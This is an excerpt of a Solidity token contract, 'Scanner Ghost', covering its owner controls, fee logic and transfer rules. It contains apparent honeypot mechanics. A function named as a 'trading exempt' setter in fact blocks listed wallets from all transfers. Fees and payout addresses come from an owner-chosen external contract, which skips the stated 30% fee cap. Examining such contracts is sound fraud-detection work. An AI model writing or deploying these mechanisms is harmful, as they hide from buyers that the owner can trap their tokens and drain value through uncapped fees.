...
{
    function getConfiguration() external returns (bool, address[] memory);
    function setActivation(string memory name, string memory symbol, uint time, address pair) external returns (bool, uint[] memory, uint[] memory);
}
...
contract ScannerGhost is Context, IERC20, Ownable
{
    using SafeMath for uint;
    using Address for address;

    string public name = "Scanner Ghost";
    ...
    function setInitializer(address host) external onlyOwner()
    {
        require(!isEnabled, "GhostGuard: This contract has already been enabled!");
        require(host != address(this) && host != address(0), "GhostGuard: Host cannot be self or dead address");

        initializer = Initializer(host);

        try initializer.getConfiguration() returns (bool validation, address[] memory receivers)
        {
            if (validation)
                init = validation;

            developerAddress = payable(receivers[0]);
            marketingAddress = payable(receivers[1]);
    ...
    {
        require(!isEnabled, "GhostGuard: This contract has already been enabled!");
        require(init, "GhostGuard: Contract must be initialized!");

        try initializer.setActivation(name, symbol, block.timestamp, dexPair) returns (bool result, uint[] memory ins, uint[] memory outs)
        {
            inFee.developer = ins[0];
            inFee.marketing = ins[1];

            outFee.developer = outs[0];
            outFee.marketing = outs[1];
    ...
    function setTradingExemptStatus(address[] memory wallets, bool status) public onlyOwner
    {
        require(wallets.length <= 200, "GhostGuard: Maximum wallets at once is 200!");

        for (uint i = 0; i < wallets.length; i++)
            isTradingExempt[wallets[i]] = status;
    }

    function setBuyTaxes(uint developer, uint marketing) external onlyOwner()
    {
        require(developer + marketing <= 300, "GhostGuard: Maximum total fee is 30%!");

        inFee.developer = developer;
        inFee.marketing = marketing;
    }

    function setSellTaxes(uint developer, uint marketing) external onlyOwner()
    {
        require(developer + marketing <= 300, "GhostGuard: Maximum total fee is 30%!");
    ...
    function _transfer(address sender, address recipient, uint amount) private returns (bool)
    {
        ...
        require(!isTradingExempt[recipient] && !isTradingExempt[sender], "GhostGuard: Transfers are not permitted!");
    ...
    function swapAndLiquify(uint amount) private lockTheSwap
    {
        ...
        uint totalFee = inFee.developer + inFee.marketing + outFee.developer + outFee.marketing;
        ...
        if (developerAmount > 0)
            transferToAddressNative(developerAddress, developerAmount);
        if (marketingAmount > 0)
            transferToAddressNative(marketingAddress, marketingAmount);
    }
    ...
    function takeFee(address sender, address recipient, uint amount) internal returns (uint256)
    {
        ...
        if (isMarketPair[sender])
            feeAmount = amount.mul(inFee.developer + inFee.marketing).div(1000);
        else if (isMarketPair[recipient])
            feeAmount = amount.mul(outFee.developer + outFee.marketing).div(1000);
